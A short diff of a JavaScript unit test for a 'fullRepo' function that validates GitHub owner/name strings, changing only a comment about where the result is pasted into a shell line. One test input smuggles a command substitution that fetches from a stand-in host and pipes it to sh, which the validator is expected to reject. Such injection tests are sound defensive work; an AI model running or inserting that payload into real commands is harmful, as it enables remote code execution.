@@ -61,7 +61,7 @@ describe('fullRepo', () => {
     expect(fullRepo('nicolovejoy/my.repo_name-2')).toBe('nicolovejoy/my.repo_name-2')
   })
 
-  // The result is pasted into a shell line on the Setup tab, so anything GitHub
+  // The result is pasted into a shell line on the Settings tab, so anything GitHub
   // would not allow in an owner/name pair must come back null.
   it('returns null for characters GitHub does not allow', () => {
     expect(fullRepo('x/y\'"$(curl evil|sh)"\'')).toBeNull()
